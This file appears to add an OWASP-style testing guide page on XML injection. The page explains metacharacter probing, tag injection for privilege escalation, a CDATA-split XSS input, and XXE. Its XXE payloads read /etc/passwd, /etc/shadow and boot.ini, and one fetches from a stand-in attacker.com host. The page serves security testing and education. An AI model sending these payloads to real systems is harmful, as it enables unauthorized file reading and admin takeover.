@@ -1,0 +1,377 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>XML Injection</title>
+</head><body><b>Summary </b><br/>
+XML Injection testing is when a tester tries to inject an XML doc to the application. If the XML parser fails to contextually validate data, then the test will yield a positive result. <br/>
+<br/>
+This section describes practical examples of XML Injection. First, an XML style communication will be defined and its working principles explained. Then, the discovery method in which we try to insert XML metacharacters. Once the first step is accomplished, the tester will have some information about the XML structure, so it will be possible to try to inject XML data and tags (Tag Injection). <br/>
+<br/>
+<br/>
+<b>&nbsp;How to Test </b><br/>
+Let's suppose there is a web application using an XML style communication in order to perform user registration. This is done by creating and adding a new &lt;user&gt; node in an xmlDb file. <br/>
+<br/>
+Let's suppose the xmlDB file is like the following: <br/>
+&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt; <br/>
+&lt;users&gt; <br/>
+&#09;&lt;user&gt; <br/>
+&#09;&#09;&lt;username&gt;gandalf&lt;/username&gt; <br/>
+&#09;&#09;&lt;password&gt;!c3&lt;/password&gt; <br/>
+&#09;&#09;&lt;userid&gt;0&lt;/userid&gt;<br/>
+&#09;&#09;&lt;mail&gt;gandalf@middleearth.com&lt;/mail&gt;<br/>
+&#09;&lt;/user&gt; <br/>
+&#09;&lt;user&gt; <br/>
+&#09;&#09;&lt;username&gt;Stefan0&lt;/username&gt; <br/>
+&#09;&#09;&lt;password&gt;w1s3c&lt;/password&gt; <br/>
+&#09;&#09;&lt;userid&gt;500&lt;/userid&gt;<br/>
+&#09;&#09;&lt;mail&gt;Stefan0@whysec.hmm&lt;/mail&gt;<br/>
+&#09;&lt;/user&gt; <br/>
+&lt;/users&gt;<br/>
+<br/>
+<br/>
+When a user registers himself by filling an HTML form, the application receives the user's data in a standard request, which, for the sake of simplicity, will be supposed to be sent as a GET request. <br/>
+<br/>
+For example, the following values: <br/>
+<b>Username: tony</b>&nbsp;<br/>
+<b>Password: Un6R34kb!e</b>&nbsp;<br/>
+<b>E-mail: s4tan@hell.com</b>&nbsp; <br/>
+<br/>
+will produce the request: <br/>
+&nbsp;http://www.example.com/addUser.php?username=tony&amp;password=Un6R34kb!e&amp;email=s4tan@hell.com &nbsp;<br/>
+<br/>
+The application, then, builds the following node: <br/>
+&lt;user&gt; <br/>
+&#09;&lt;username&gt;tony&lt;/username&gt; <br/>
+&#09;&lt;password&gt;Un6R34kb!e&lt;/password&gt; <br/>
+&#09;&lt;userid&gt;500&lt;/userid&gt;<br/>
+&#09;&lt;mail&gt;s4tan@hell.com&lt;/mail&gt;<br/>
+&lt;/user&gt;<br/>
+<br/>
+&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt; <br/>
+&lt;users&gt; <br/>
+&#09;&lt;user&gt; <br/>
+&#09;&#09;&lt;username&gt;gandalf&lt;/username&gt; <br/>
+&#09;&#09;&lt;password&gt;!c3&lt;/password&gt; <br/>
+&#09;&#09;&lt;userid&gt;0&lt;/userid&gt;<br/>
+&#09;&#09;&lt;mail&gt;gandalf@middleearth.com&lt;/mail&gt;<br/>
+&#09;&lt;/user&gt; <br/>
+&#09;&lt;user&gt; <br/>
+&#09;&#09;&lt;username&gt;Stefan0&lt;/username&gt; <br/>
+&#09;&#09;&lt;password&gt;w1s3c&lt;/password&gt; <br/>
+&#09;&#09;&lt;userid&gt;500&lt;/userid&gt;<br/>
+&#09;&#09;&lt;mail&gt;Stefan0@whysec.hmm&lt;/mail&gt;<br/>
+&#09;&lt;/user&gt; <br/>
+&#09;&lt;user&gt; <br/>
+&#09;&#09;&lt;username&gt;tony&lt;/username&gt; <br/>
+&#09;&#09;&lt;password&gt;Un6R34kb!e&lt;/password&gt; <br/>
+&#09;&#09;&lt;userid&gt;500&lt;/userid&gt;<br/>
+&#09;&#09;&lt;mail&gt;s4tan@hell.com&lt;/mail&gt;<br/>
+&#09;&lt;/user&gt; <br/>
+&lt;/users&gt;<br/>
+<br/>
+<b>Discovery </b><br/>
+The first step in order to test an application for the presence of a XML Injection vulnerability consists of trying to insert XML metacharacters. <br/>
+<br/>
+XML metacharacters are: <br/>
+&nbsp;<ul><li>&nbsp;<b>Single quote: ' </b>&nbsp;- When not sanitized, this character could throw an exception during XML parsing, if the injected value is going to be part of an attribute value in a tag.</li>
+</ul>
+<br/>
+As an example, let's suppose there is the following attribute: <br/>
+<b>&lt;node attrib='$inputValue'/&gt;</b>&nbsp; <br/>
+<br/>
+So, if: <br/>
+<b>inputValue = foo'</b>&nbsp; <br/>
+<br/>
+is instantiated and then is inserted as the attrib value: <br/>
+<b>&lt;node attrib='foo''/&gt;</b>&nbsp; <br/>
+<br/>
+then, the resulting XML document is not well formed. <br/>
+&nbsp;<ul><li>&nbsp;<b>Double quote: " </b>- this character has the same meaning as single quote and it could be used if the attribute value is enclosed in double quotes.</li>
+</ul>
+<b>&lt;node attrib="$inputValue"/&gt;</b>&nbsp; <br/>
+<br/>
+So if: <br/>
+<b>$inputValue = foo"</b>&nbsp; <br/>
+<br/>
+the substitution gives: <br/>
+<b>&lt;node attrib="foo""/&gt;</b>&nbsp; <br/>
+<br/>
+and the resulting XML document is invalid. <br/>
+&nbsp;<ul><li>&nbsp;<b>Angular parentheses: &gt; and &lt;</b>&nbsp;- By adding an open or closed angular parenthesis in a user input like the following:</li>
+</ul>
+<b>Username = foo&lt;</b>&nbsp; <br/>
+the application will build a new node: <br/>
+&lt;user&gt; <br/>
+&nbsp; &nbsp; &nbsp;&lt;username&gt;foo&lt;&lt;/username&gt; <br/>
+&nbsp; &nbsp; &nbsp;&lt;password&gt;Un6R34kb!e&lt;/password&gt; <br/>
+&nbsp; &nbsp; &nbsp;&lt;userid&gt;500&lt;/userid&gt;<br/>
+&nbsp; &nbsp; &nbsp;&lt;mail&gt;s4tan@hell.com&lt;/mail&gt;<br/>
+&lt;/user&gt;<br/>
+<br/>
+<br/>
+but, because of the presence of the open '&lt;', the resulting XML document is invalid. <br/>
+<ul><li>&nbsp;<b>Comment tag: &lt;!--/--&gt;</b>&nbsp;- This sequence of characters is interpreted as the beginning/end of a comment. So by injecting one of them in Username parameter:</li>
+</ul>
+<b>Username = foo&lt;!--</b>&nbsp; <br/>
+the application will build a node like the following: <br/>
+&nbsp; <br/>
+&lt;user&gt; <br/>
+&nbsp; &nbsp; &lt;username&gt;foo&lt;!--&lt;/username&gt; <br/>
+&nbsp; &nbsp; &lt;password&gt;Un6R34kb!e&lt;/password&gt; <br/>
+&nbsp; &nbsp; &lt;userid&gt;500&lt;/userid&gt;<br/>
+&nbsp; &nbsp; &lt;mail&gt;s4tan@hell.com&lt;/mail&gt;<br/>
+&lt;/user&gt;<br/>
+<br/>
+which won't be a valid XML sequence. <br/>
+&nbsp;<ul><li>&nbsp;<b>Ampersand: &amp; </b>- The ampersand is used in the XML syntax to represent entities. The format of an entity is '&amp;symbol;'. An entity is mapped to a character in the Unicode character set.</li>
+</ul>
+<br/>
+For example: <br/>
+&nbsp;<b>&lt;tagnode&gt;&amp;lt;&lt;/tagnode&gt;</b>&nbsp; <br/>
+<br/>
+is well formed and valid, and represents the '&lt;' ASCII character. <br/>
+If '&amp;' is not encoded itself with &amp;amp;, it could be used to test XML injection. <br/>
+<br/>
+In fact, if an input like the following is provided: <br/>
+&nbsp;<b>Username = &amp;foo</b>&nbsp; <br/>
+a new node will be created: <br/>
+&nbsp; <br/>
+&lt;user&gt; <br/>
+&lt;username&gt;&amp;foo&lt;/username&gt; <br/>
+&lt;password&gt;Un6R34kb!e&lt;/password&gt; <br/>
+&lt;userid&gt;500&lt;/userid&gt;<br/>
+&lt;mail&gt;s4tan@hell.com&lt;/mail&gt;<br/>
+&lt;/user&gt;<br/>
+<br/>
+<br/>
+but, again, the document is not valid: &amp;foo is not terminated with ';' and the &amp;foo; entity is undefined. <br/>
+<ul><li>&nbsp;<b>CDATA section delimiters: &lt;![CDATA[ / ]]&gt;</b>&nbsp;- CDATA sections are used to escape blocks of text containing characters which would otherwise be recognized as markup. In other words, characters enclosed in a CDATA section are not parsed by an XML parser.</li>
+</ul>
+<br/>
+For example, if there is the need to represent the string '&lt;foo&gt;' inside a text node, a CDATA section may be used: <br/>
+&nbsp; <br/>
+&lt;node&gt;<br/>
+&nbsp; &nbsp; &lt;![CDATA[&lt;foo&gt;]]&gt;<br/>
+&lt;/node&gt;<br/>
+<br/>
+so that '&lt;foo&gt;' won't be parsed as markup and will be considered as character data.<br/>
+<br/>
+If a node is built in the following way:<br/>
+&lt;username&gt;&lt;![CDATA[&lt;$userName]]&gt;&lt;/username&gt;<br/>
+<br/>
+the tester could try to inject the end CDATA string ']]&gt;' in order to try to invalidate the XML document.<br/>
+<br/>
+userName &nbsp;= ]]&gt;<br/>
+<br/>
+this will become:<br/>
+&lt;username&gt;&lt;![CDATA[]]&gt;]]&gt;&lt;/username&gt;<br/>
+<br/>
+which is not a valid XML fragment.<br/>
+<br/>
+<br/>
+<b>Another test is related to CDATA tag.</b>&nbsp;<br/>
+Suppose that the XML document is processed to generate an HTML page. In this case, the CDATA section delimiters may be simply eliminated, without further inspecting their contents. Then, it is possible to inject HTML tags, which will be included in the generated page, completely bypassing existing sanitization routines.<br/>
+<br/>
+Let's consider a concrete example. Suppose we have a node containing some text that will be displayed back to the user.<br/>
+<br/>
+&nbsp;&lt;html&gt;<br/>
+&nbsp;$HTMLCode<br/>
+&nbsp;&lt;/html&gt;<br/>
+<br/>
+Then, an attacker can provide the following input:<br/>
+<br/>
+$HTMLCode = &lt;![CDATA[&lt;]]&gt;script&lt;![CDATA[&gt;]]&gt;alert('xss')&lt;![CDATA[&lt;]]&gt;/script&lt;![CDATA[&gt;]]&gt;<br/>
+<br/>
+and obtain the following node:<br/>
+<br/>
+&lt;html&gt;<br/>
+&nbsp; &lt;![CDATA[&lt;]]&gt;script&lt;![CDATA[&gt;]]&gt;alert('xss')&lt;![CDATA[&lt;]]&gt;/script&lt;![CDATA[&gt;]]&gt;<br/>
+&nbsp;&lt;/html&gt;<br/>
+<br/>
+During the processing, the CDATA section delimiters are eliminated, generating the following HTML code:<br/>
+<br/>
+&lt;script&gt;alert('XSS')&lt;/script&gt;<br/>
+<br/>
+The result is that the application is vulnerable to XSS.<br/>
+<br/>
+External Entity: The set of valid entities can be extended by defining new entities. If the definition of an entity is a URI, the entity is called an external entity. Unless configured to do otherwise, external entities force the XML parser to access the resource specified by the URI, e.g., a file on the local machine or on a remote systems. This behavior exposes the application to XML eXternal Entity (XXE) attacks, which can be used to perform denial of service of the local system, gain unauthorized access to files on the local machine, scan remote machines, and perform denial of service of remote systems.<br/>
+<br/>
+<br/>
+To test for XXE vulnerabilities, one can use the following input:<br/>
+<br/>
+&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;<br/>
+&nbsp;&lt;!DOCTYPE foo [ &nbsp;<br/>
+&nbsp; &lt;!ELEMENT foo ANY &gt;<br/>
+&nbsp; &lt;!ENTITY xxe SYSTEM "file:///dev/random" &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;<br/>
+<br/>
+<br/>
+This test could crash the web server (on a UNIX system), if the XML parser attempts to substitute the entity with the contents of the /dev/random file.<br/>
+<br/>
+<br/>
+Other useful tests are the following:<br/>
+<br/>
+<br/>
+&nbsp;&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;<br/>
+&nbsp;&lt;!DOCTYPE foo [ &nbsp;<br/>
+&nbsp; &nbsp;&lt;!ELEMENT foo ANY &gt;<br/>
+&nbsp; &nbsp;&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;<br/>
+<br/>
+&nbsp;&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;<br/>
+&nbsp;&lt;!DOCTYPE foo [ &nbsp;<br/>
+&nbsp; &nbsp;&lt;!ELEMENT foo ANY &gt;<br/>
+&nbsp; &nbsp;&lt;!ENTITY xxe SYSTEM "file:///etc/shadow" &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;<br/>
+<br/>
+&nbsp;&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;<br/>
+&nbsp;&lt;!DOCTYPE foo [ &nbsp;<br/>
+&nbsp; &nbsp;&lt;!ELEMENT foo ANY &gt;<br/>
+&nbsp; &nbsp;&lt;!ENTITY xxe SYSTEM "file:///c:/boot.ini" &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;<br/>
+<br/>
+&nbsp;&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;<br/>
+&nbsp;&lt;!DOCTYPE foo [ &nbsp;<br/>
+&nbsp; &nbsp;&lt;!ELEMENT foo ANY &gt;<br/>
+&nbsp; &nbsp;&lt;!ENTITY xxe SYSTEM "http://www.attacker.com/text.txt" &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<b>Tag Injection</b><br/>
+Once the first step is accomplished, the tester will have some information about the structure of the XML document. Then, it is possible to try to inject XML data and tags. We will show an example of how this can lead to a privilege escalation attack.<br/>
+<br/>
+<br/>
+Let's considering the previous application. By inserting the following values:<br/>
+<br/>
+Username: tony<br/>
+Password: Un6R34kb!e<br/>
+E-mail: s4tan@hell.com&lt;/mail&gt;&lt;userid&gt;0&lt;/userid&gt;&lt;mail&gt;s4tan@hell.com<br/>
+<br/>
+the application will build a new node and append it to the XML database:<br/>
+<br/>
+&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt; <br/>
+&lt;users&gt; <br/>
+&#09;&lt;user&gt; <br/>
+&#09;&#09;&lt;username&gt;gandalf&lt;/username&gt; <br/>
+&#09;&#09;&lt;password&gt;!c3&lt;/password&gt; <br/>
+&#09;&#09;&lt;userid&gt;0&lt;/userid&gt;<br/>
+&#09;&#09;&lt;mail&gt;gandalf@middleearth.com&lt;/mail&gt;<br/>
+&#09;&lt;/user&gt; <br/>
+&#09;&lt;user&gt; <br/>
+&#09;&#09;&lt;username&gt;Stefan0&lt;/username&gt; <br/>
+&#09;&#09;&lt;password&gt;w1s3c&lt;/password&gt; <br/>
+&#09;&#09;&lt;userid&gt;500&lt;/userid&gt;<br/>
+&#09;&#09;&lt;mail&gt;Stefan0@whysec.hmm&lt;/mail&gt;<br/>
+&#09;&lt;/user&gt; <br/>
+&#09;&lt;user&gt; <br/>
+&#09;&#09;&lt;username&gt;tony&lt;/username&gt; <br/>
+&#09;&#09;&lt;password&gt;Un6R34kb!e&lt;/password&gt; <br/>
+&#09;&#09;&lt;userid&gt;500&lt;/userid&gt;<br/>
+&#09;&#09;&lt;mail&gt;s4tan@hell.com&lt;/mail&gt;&lt;userid&gt;0&lt;/userid&gt;&lt;mail&gt;s4tan@hell.com&lt;/mail&gt;<br/>
+&#09;&lt;/user&gt; <br/>
+&lt;/users&gt;<br/>
+<br/>
+<br/>
+The resulting XML file is well formed. Furthermore, it is likely that, for the user tony, the value associated with the userid tag is the one appearing last, i.e., 0 (the admin ID). In other words, we have injected a user with administrative privileges.<br/>
+<br/>
+<br/>
+The only problem is that the userid tag appears twice in the last user node. Often, XML documents are associated with a schema or a DTD and will be rejected if they don't comply with it.<br/>
+<br/>
+<br/>
+Let's suppose that the XML document is specified by the following DTD:<br/>
+<br/>
+&lt;!DOCTYPE users [<br/>
+&#09; &nbsp;&lt;!ELEMENT users (user+) &gt;<br/>
+&#09; &nbsp;&lt;!ELEMENT user (username,password,userid,mail+) &gt;<br/>
+&#09; &nbsp;&lt;!ELEMENT username (#PCDATA) &gt;<br/>
+&#09; &nbsp;&lt;!ELEMENT password (#PCDATA) &gt;<br/>
+&#09; &nbsp;&lt;!ELEMENT userid (#PCDATA) &gt;<br/>
+&#09; &nbsp;&lt;!ELEMENT mail (#PCDATA) &gt;<br/>
+]&gt;<br/>
+<br/>
+<br/>
+Note that the userid node is defined with cardinality 1. In this case, the attack we have shown before (and other simple attacks) will not work, if the XML document is validated against its DTD before any processing occurs.<br/>
+<br/>
+<br/>
+However, this problem can be solved, if the tester controls the value of some nodes preceding the offending node (userid, in this example). In fact, the tester can comment out such node, by injecting a comment start/end sequence:<br/>
+<br/>
+<br/>
+Username: tony<br/>
+Password: Un6R34kb!e&lt;/password&gt;&lt;!--<br/>
+E-mail: --&gt;&lt;userid&gt;0&lt;/userid&gt;&lt;mail&gt;s4tan@hell.com<br/>
+<br/>
+In this case, the final XML database is:<br/>
+<br/>
+&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt; <br/>
+&lt;users&gt; <br/>
+&#09;&lt;user&gt; <br/>
+&#09;&#09;&lt;username&gt;gandalf&lt;/username&gt; <br/>
+&#09;&#09;&lt;password&gt;!c3&lt;/password&gt; <br/>
+&#09;&#09;&lt;userid&gt;0&lt;/userid&gt;<br/>
+&#09;&#09;&lt;mail&gt;gandalf@middleearth.com&lt;/mail&gt;<br/>
+&#09;&lt;/user&gt; <br/>
+&#09;&lt;user&gt; <br/>
+&#09;&#09;&lt;username&gt;Stefan0&lt;/username&gt; <br/>
+&#09;&#09;&lt;password&gt;w1s3c&lt;/password&gt; <br/>
+&#09;&#09;&lt;userid&gt;500&lt;/userid&gt;<br/>
+&#09;&#09;&lt;mail&gt;Stefan0@whysec.hmm&lt;/mail&gt;<br/>
+&#09;&lt;/user&gt; <br/>
+&#09;&lt;user&gt; <br/>
+&#09;&#09;&lt;username&gt;tony&lt;/username&gt; <br/>
+&#09;&#09;&lt;password&gt;Un6R34kb!e&lt;/password&gt;&lt;!--&lt;/password&gt; <br/>
+&#09;&#09;&lt;userid&gt;500&lt;/userid&gt;<br/>
+&#09;&#09;&lt;mail&gt;--&gt;&lt;userid&gt;0&lt;/userid&gt;&lt;mail&gt;s4tan@hell.com&lt;/mail&gt;<br/>
+&#09;&lt;/user&gt;<br/>
+&lt;/users&gt;<br/>
+<br/>
+<br/>
+The original userid node has been commented out, leaving only the injected one. The document now complies with its DTD rules.<br/>
+<br/>
+<b>Source Code Review </b><br/>
+The following Java API may be vulnerable to XXE if they are not configured properly. <br/>
+&nbsp;<ul><li>&nbsp;javax.xml.parsers.DocumentBuilder</li>
+<li>&nbsp;javax.xml.parsers.DocumentBuildFactory</li>
+<li>&nbsp;org.xml.sax.EntityResolver</li>
+<li>&nbsp;org.dom4j.*</li>
+<li>&nbsp;javax.xml.parsers.SAXParser</li>
+<li>&nbsp;javax.xml.parsers.SAXParserFactory</li>
+<li>&nbsp;TransformerFactory</li>
+<li>&nbsp;SAXReader</li>
+<li>&nbsp;DocumentHelper</li>
+<li>&nbsp;SAXBuilder</li>
+<li>&nbsp;SAXParserFactory</li>
+<li>&nbsp;XMLReaderFactory</li>
+<li>&nbsp;XMLInputFactory</li>
+<li>&nbsp;SchemaFactory</li>
+<li>&nbsp;DocumentBuilderFactoryImpl</li>
+<li>&nbsp;SAXTransformerFactory</li>
+<li>&nbsp;DocumentBuilderFactoryImpl</li>
+<li>&nbsp;XMLReader</li>
+<li>&nbsp;Xerces: DOMParser, DOMParserImpl, SAXParser, XMLParser</li>
+</ul>
+<br/>
+Check source code if the docType, external DTD, and external parameter entities are set as forbidden uses. <br/>
+&nbsp;<ul><li>&nbsp;<a href="https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet">https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet</a></li>
+</ul>
+<br/>
+In addition, the Java POI office reader may be vulnerable to XXE if the version is under 3.10.1. <br/>
+The version of POI library can be identified from the file name of the JAR. For example, <br/>
+&nbsp;<ul><li>&nbsp;poi-3.8.jar</li>
+<li>&nbsp;poi-ooxml-3.8.jar</li>
+</ul>
+<br/>
+The followings source code keyword may apply to C. <br/>
+&nbsp;<ul><li>&nbsp;libxml2: xmlCtxtReadMemory,xmlCtxtUseOptions,xmlParseInNodeContext,xmlReadDoc,xmlReadFd,xmlReadFile ,xmlReadIO,xmlReadMemory, xmlCtxtReadDoc ,xmlCtxtReadFd,xmlCtxtReadFile,xmlCtxtReadIO </li>
+<li>&nbsp;libxerces-c: XercesDOMParser, SAXParser, SAX2XMLReader</li>
+</ul>
+<br/>
+<b>References </b><br/>
+<b>Whitepapers</b><br/>
+<ul><li>&nbsp;[1] Alex Stamos: "Attacking Web Services" - <a href="http://www.owasp.org/images/d/d1/AppSec2005DC-Alex_Stamos-Attacking_Web_Services.ppt">http://www.owasp.org/images/d/d1/AppSec2005DC-Alex_Stamos-Attacking_Web_Services.ppt</a></li>
+<li>&nbsp;Gregory Steuck, "XXE (Xml eXternal Entity) attack", <a href="http://www.securityfocus.com/archive/1/297714">http://www.securityfocus.com/archive/1/297714</a></li>
+<li>&nbsp;OWASP XXE Prevention Cheat Sheet <a href="https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet">https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet</a></li>
+</ul>
+&nbsp;<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+</body></html>
